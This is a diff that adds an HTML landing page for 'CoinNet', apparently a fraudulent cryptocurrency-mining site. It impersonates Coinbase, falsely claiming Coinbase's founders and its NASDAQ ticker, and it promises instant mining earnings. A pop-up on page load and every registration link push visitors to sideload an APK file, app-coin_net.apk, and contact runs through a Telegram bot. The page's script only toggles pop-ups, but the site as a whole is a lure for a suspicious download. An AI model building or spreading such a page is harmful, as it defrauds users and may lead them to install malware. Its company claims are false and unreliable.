@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="apple-itunes-app" content="https://auto-download.github.io/.com/">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+  <title>CoinNet</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      text-align: center;
+      height: 100%;
+      width: 100%;
+    }
+
+    .right-side {
+      flex: 0;
+      background-color: #ffffff;
+      color: #000000;
+      overflow-y: auto;
+    }
+
+    .container {
+      padding: 20px;
+      max-width: 900px;
+      text-align: center;      
+    }
+
+    .ads-wrapper {
+      position: relative;
+      width: 100%;
+      height: auto;
+    }
+
+    .ads-image {
+      display: block;
+      width: 100%;
+      height: 40vh;
+      object-fit: cover;
+      border-bottom-left-radius: 130px;
+      border-bottom-right-radius: 130px;
+    }
+
+    .logo-overlay {
+      position: absolute;
+      bottom: -30px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 60px;
+      background: #000000;
+      border-radius: 50px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.7);
+    }
+
+    h1 {
+      font-size: 1.8em;
+      margin: 20px 0;
+      color: #000;
+    }
+
+    .highlight {
+      background: #fff;
+      color: #000000;
+      padding: 5px 10px;
+      border-radius: 12px;
+      font-weight: bold;
+    }
+
+    .arrow {
+      font-size: 50px;
+      margin: 20px 0;
+      color: #000;
+    }
+
+    .downloads {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 15px;
+      flex-wrap: wrap;
+      margin-bottom: 30px;
+    }
+
+    .downloads img {
+      height: 100px;
+      width: 100%;
+      cursor: none;
+    }
+
+    .downloads .img {
+      height: 150px;
+      width: 100%;
+      cursor: none;
+    }
+
+    .qr {
+      height: 225px;
+      width: 250px;
+      background: #ffffff;
+    }
+
+    .phone {
+      position: relative;
+      display: inline-block;
+    }
+
+    .phone img {
+      max-width: 300px;
+      border-radius: 20px;
+    }
+
+    .phone-number {
+      color: #000000;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+    }
+    
+       #second-popup .app-popup-box {
+     max-width: 320px;
+     width: 70%;
+     height: 600px; /* match approx height */
+     overflow-y: auto;
+     padding: 24px 28px;
+     background: #1a1a1a;
+     border-radius: 14px;
+     box-shadow: 0 0 15px #000;
+     scrollbar-width: thin;
+   }
+
+    footer {
+      margin-top: 40px;
+      font-size: 14px;
+      color: #000;
+    }
+
+    #second-popup {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: rgba(0,0,0,0.7);
+      z-index: 9999;
+    }
+    
+      #app-download-popup {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: rgba(0,0,0,0.7);
+      z-index: 9999;
+    }
+
+    #app-download-popup.hidden,
+    #second-popup.hidden {
+      display: none;
+    }
+
+    .app-popup-box {
+      background: #1a1a1a;
+      color: #000000;
+      padding: 24px 28px;
+      border-radius: 14px;
+      text-align: center;
+      box-shadow: 0 0 15px #000;
+      max-width: 320px;
+      width: 70%;
+    }
+
+    .app-popup-box h2 {
+      margin-bottom: 12px;
+      font-size: 1.2rem;
+    }
+
+    .app-popup-box p {
+      font-size: 0.95rem;
+      margin-bottom: 18px;
+      color: #ccc;
+    }
+
+    .app-popup-btns a,
+    .app-popup-btns button {
+      display: inline-block;
+      margin: 4px;
+      padding: 10px 20px;
+      background: #a259ff;
+      color: #000000;
+      border: none;
+      border-radius: 10px;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .app-popup-btns button {
+      background: #333;
+      cursor: none;
+    }
+
+    .company-info {
+      margin-top: 40px;
+      background-color: #a259ff;
+      color: #000000;
+      padding: 20px;
+      border-radius: 12px;
+      text-align: left;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+      font-size: 14px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+    }
+
+    .company-info h2 {
+      margin-bottom: 15px;
+      font-size: 1.4em;
+      color: #333;
+    }
+
+    .company-info a {
+      text-decoration: none;
+    }
+
+    .company-info a:hover {
+      text-decoration: underline;
+    }
+
+    #menu-button {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background-color: #a259ff;
+      color: white;
+      border: none;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      font-size: 24px;
+      cursor: none;
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+    }
+
+    #menu-options {
+      position: fixed;
+      top: 80px;
+      right: 20px;
+      background-color: #fff;
+      color: #000;
+      border-radius: 12px;
+      padding: 10px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.2);
+      display: none;
+      flex-direction: column;
+      z-index: 999;
+    }
+
+    #menu-options a {
+      padding: 8px 12px;
+      text-decoration: none;
+      color: #000;
+      font-weight: bold;
+      border-bottom: 1px solid #eee;
+    }
+
+    #menu-options a:last-child {
+      border-bottom: none;
+    }
+
+    #menu-options a:hover {
+      background-color: #f0f0f0;
+    }
+
+    @media screen and (max-width: 768px) {
+      .split-page {
+        flex-direction: column;
+      }
+
+      .left-side,
+      .right-side {
+        flex: unset;
+        height: 50vh;
+        width: 100%;
+      }
+
+      .right-side {
+        height: auto;
+      }
+    }
+
+    #about-popup {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: rgba(0,0,0,0.7);
+      z-index: 9999;
+      height: 100%;
+    }
+
+    #about-popup.hidden {
+      display: none;
+    }
+    
+        .step {
+      position: relative;
+      margin-bottom: 40px;
+      padding-left: 50px;
+    }
+
+    .step:last-child {
+      margin-bottom: 0;
+    }
+
+    .step::before {
+      content: '';
+      position: absolute;
+      left: 22px;
+      top: 0;
+      bottom: 0;
+      width: 2px;
+      background: #444;
+    }
+
+    .step-number {
+      position: absolute;
+      left: 0;
+      top: 80px;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background-color: #ff00b8;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      z-index: 1;
+    }
+
+    .step-image {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+
+    .step-title {
+      font-size: 18px;
+      margin-bottom: 8px;
+      font-weight: bold;
+    }
+
+    .step-description {
+      font-size: 14px;
+      line-height: 1.5;
+      color: #ccc;
+    }
+
+    .close-button {
+      position: absolute;
+      top: 8px;
+      right: 12px;
+      font-size: 18px;
+      cursor: none;
+      color: white;
+    }
+    
+    .qr {
+  height: 225px;
+  width: 250px;
+  background: #ffffff;
+  border-radius: 20px;
+  box-shadow: 
+    0 10px 20px rgba(0, 0, 0, 0.3),
+    0 6px 6px rgba(0, 0, 0, 0.25),
+    0 0 30px rgba(162, 89, 255, 0.4);
+  animation: floatQR 6s ease-in-out infinite;
+  transition: transform 0.5s ease, box-shadow 0.5s ease;
+  margin-top: 20px;
+}
+
+@keyframes floatQR {
+  0% {
+    transform: translateY(0px) rotate(0deg) scale(1);
+    box-shadow: 
+      0 10px 20px rgba(0, 0, 0, 0.3),
+      0 6px 6px rgba(0, 0, 0, 0.25),
+      0 0 30px rgba(162, 89, 255, 0.4);
+  }
+  50% {
+    transform: translateY(-15px) rotate(1deg) scale(1.02);
+    box-shadow: 
+      0 15px 25px rgba(0, 0, 0, 0.4),
+      0 8px 8px rgba(0, 0, 0, 0.3),
+      0 0 50px rgba(162, 89, 255, 0.5);
+  }
+  100% {
+    transform: translateY(0px) rotate(0deg) scale(1);
+    box-shadow: 
+      0 10px 20px rgba(0, 0, 0, 0.3),
+      0 6px 6px rgba(0, 0, 0, 0.25),
+      0 0 30px rgba(162, 89, 255, 0.4);
+  }
+}
+  </style>
+</head>
+<body>
+
+  <!-- First Popup -->
+  <div id="app-download-popup" class="hidden">
+    <div class="app-popup-box">
+      <h2 style="color: #a259ff;">Download Our Mobile App</h2>
+      <p>Get the full experience by installing our app on your device.</p>
+      <div class="app-popup-btns">
+        <a href="app-coin_net.apk" class="download-btn" style="cursor: none;" download>Download Now</a>
+        <button style="cursor: none;" onclick="closeAppPopup()">Close</button>
+      </div>
+    </div>
+  </div>  
+
+  <!-- Second Popup -->
+  <div id="second-popup" class="hidden">
+    <div class="app-popup-box">
+        
+        <span class="close-button" onclick="closeSecondPopup()">✕</span>
+
+  <div class="step">
+    <img src="01.png" alt="Make Account" class="step-image">
+    <div class="step-number">01</div>
+    <div class="step-title" style="color: #a259ff;">Make Account</div>
+    <div class="step-description">
+      Start by creating your free Active Miner account. Provide your basic information and verify your email to get started. It's quick and easy.
+    </div>
+  </div>
+
+  <div class="step">
+    <img src="02.png" alt="Dashboard" class="step-image">
+    <div class="step-number">02</div>
+    <div class="step-title" style="color: #a259ff;">Login To Dashboard And Active Miner</div>
+    <div class="step-description">
+      Once your account is created, log in to your personalized dashboard. Select your mining plan and activate your miner. Begin earning cryptocurrency instantly.
+    </div>
+  </div>
+
+  <div class="step">
+    <img src="03.png" alt="Withdraw" class="step-image">
+    <div class="step-number">03</div>
+    <div class="step-title" style="color: #a259ff;">Withdraw If Minimum $15</div>
+    <div class="step-description">
+      Easily withdraw your earnings directly to your wallet once you reach the minimum withdrawal threshold of $15. We offer fast and secure transactions.
+    </div>
+    </div>
+  </div>
+  </div>
+
+   <!-- Floating menu -->
+  <div id="menu-button" onclick="toggleMenu()">☰</div>
+  <div id="menu-options">
+    <a href="https://t.me/net_45_bot" style="cursor: none; border-radius: 10px;">Get In Touch</a>
+  <a href="javascript:void(0);" onclick="showAboutPopup()" style="cursor: none; border-radius: 10px;">About Us</a>
+    <a href="app-coin_net.apk" style="cursor: none; border-radius: 10px;">Create an Account</a>
+  </div>
+
+  <div class="split-page">
+    <div class="left-side">
+      <div class="ads-wrapper">
+        <img style="bottom-radius: 250px;" src="ads.png" alt="Ad Image" class="ads-image">
+        <img src="logo.png" alt="SmartPay Logo" class="logo-overlay">
+      </div>
+    </div>
+
+    <div class="right-side">
+      <div class="container">
+        <div class="top-content">
+          <h1>Access all our services from your <span class="highlight" style="color: #ffffff; background: #000000;">mobile device!</span></h1>
+        </div>
+
+        <div class="arrow">&#8595;</div>
+
+        <div class="downloads">
+          <a href="#"><img class="image 1" src="android.png" alt="Download on App Store"/></a>
+          <a href="#"><img class="img" src="ios.png" alt="Download on Play Store"/></a>
+        </div>
+
+        <div class="phone">
+          <img src="log.png" alt="Phone in Hand" />
+          <p class="phone-number">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="#ccc" stroke-width="1.5" viewBox="0 0 24 24" width="18" height="18" style="color: #000000;">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M2.25 4.5A2.25 2.25 0 0 1 4.5 2.25h2.25a.75.75 0 0 1 .75.75v3A.75.75 0 0 1 6.75 6.75H6a11.25 11.25 0 0 0 11.25 11.25v-.75a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 .75.75V19.5a2.25 2.25 0 0 1-2.25 2.25h-.75C9.179 21.75 2.25 14.821 2.25 6V4.5z"/>
+            </svg>
+            +1 821-221-8509
+          </p>
+          <img src="qr.png" alt="QR Code" class="qr"/>
+        </div>
+
+        <footer>
+          <p>www.coin-net-blockchain.com</p>
+        </footer>
+
+        <section class="company-info" id="contact-section">
+          <h2>Contact & Company Info</h2>
+          <p><strong>Address:</strong> 134 Drive way, San Francisco, California, USA</p>
+          <p><strong>Email:</strong> contact@coinnet_web.com</p>
+          <p><strong>Phone:</strong> +1 821-221-8509</p>
+          <p><strong>CEO:</strong> Jane Doe</p>
+           <p><strong>Public Company:</strong> Yes (traded on NASDAQ under ticker: COIN)</p>
+          <p><strong>Website:</strong> <a href="https://coin-net-blockchain.github.io/.com/" target="_blank" rel="noopener" style="color:#000; cursor: none;">www.coin-net-blockchain.com</a></p>
+        </section>
+
+        <div id="create-account" style="margin-top: 40px;">
+          <h2>Create an Account</h2>
+          <p><a href="app-coin_net.apk" style="color: #a259ff; font-weight: bold; cursor: none;">Click here to register</a></p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<div id="about-popup" class="hidden">
+  <div class="app-popup-box">
+    <h2 style="color: #a259ff;">About Us</h2>
+    <p>
+CoinNet is a popular cryptocurrency exchange platform that allows users to buy, sell, store, mine and manage digital currencies like Bitcoin (BTC), Ethereum (ETH), and many others. <br>
+
+🔹 Overview. <br>
+
+<strong>Founded: </strong>2024 by Brian Armstrong and Fred Ehrsam <br>
+<strong>Headquarters: </strong>San Francisco, California, USA  <br>
+<strong>Public Company: </strong>Yes (traded on NASDAQ under ticker: COIN)  <br>
+<strong>Main Website: </strong>www.coin-net-blockchain.com
+
+---<br>
+
+<b style="margin-top: 10%; color: #a259ff;">Key Features</b><br>
+
+1. Buy/Sell Cryptocurrencies <br>
+2. Wallet Services <br>
+3. Crypto Staking <br>
+4. Cryptocurrency Mining <br>
+5. Security <br>
+6. Cross Multiple E-Wallets
+---<br>
+
+CoinNet is a secure and easy-to-use gateway into the world of cryptocurrency for individuals and institutions.
+    </p>
+    <div class="app-popup-btns">
+      <button onclick="closeAboutPopup()" style="background: #a259ff;">Close</button>
+    </div>
+  </div>
+</div>
+  <!-- JavaScript -->
+  <script>
+    function closeAppPopup() {
+      document.getElementById('app-download-popup').classList.add('hidden');
+      document.getElementById('second-popup').classList.remove('hidden');
+      sessionStorage.setItem('popupShown', 'yes');
+    }
+
+    function closeSecondPopup() {
+      document.getElementById('second-popup').classList.add('hidden');
+    }
+
+    window.onload = function () {
+      if (!sessionStorage.getItem('popupShown')) {
+        document.getElementById('app-download-popup').classList.remove('hidden');
+      }
+    };
+
+    function toggleMenu() {
+      const menu = document.getElementById("menu-options");
+      menu.style.display = menu.style.display === "flex" ? "none" : "flex";
+    }
+
+    document.addEventListener("click", function (e) {
+      const menu = document.getElementById("menu-options");
+      const button = document.getElementById("menu-button");
+      if (!menu.contains(e.target) && !button.contains(e.target)) {
+        menu.style.display = "none";
+      }
+    });
+
+    function showAboutPopup() {
+      document.getElementById('about-popup').classList.remove('hidden');
+    }
+
+    function closeAboutPopup() {
+      document.getElementById('about-popup').classList.add('hidden');
+    }
+  </script>
+
+</body>
+</html>
